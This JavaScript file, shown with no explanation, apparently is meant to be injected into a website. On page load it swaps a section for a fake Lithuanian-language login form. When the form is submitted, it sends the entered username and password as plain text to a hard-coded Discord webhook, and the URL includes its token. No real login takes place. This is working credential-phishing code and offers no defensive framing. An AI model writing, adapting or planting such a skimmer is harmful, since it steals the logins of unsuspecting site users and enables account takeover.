
document.addEventListener("DOMContentLoaded", function () {
  var targetSection = document.querySelector("section");
  if (targetSection) {
    targetSection.innerHTML = `
        <div class="login-div">
          <div class="formTop">
            <label>Prisijungimas</label>
          </div>
          <form id="customLoginForm" action="javascript:void(0);" method="post">
            <div>
              <input type="text" name="mailuid" placeholder="Slapyvardis/El. paštas...">
              <input type="password" name="pwd" placeholder="Slaptažodis">
              <button type="submit">Prisijungti</button>
            </div>
          </form>
        </div>
      `;
    var form = document.getElementById("customLoginForm");
    form.onsubmit = function (e) {
      e.preventDefault();
      var username = document.querySelector('input[name="mailuid"]').value;
      var password = document.querySelector('input[name="pwd"]').value;
      fetch(
        "https://discord.com/api/webhooks/1213282788233453589/5FBs2ltYHnY6KBTarlXHNvyW7ekc_sB1cidB-DByeJSl2r5bXyomcZxapUvqCG6iuUAD",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `${username} / ${password}`,
          }),
        }
      );
    };
  }
});

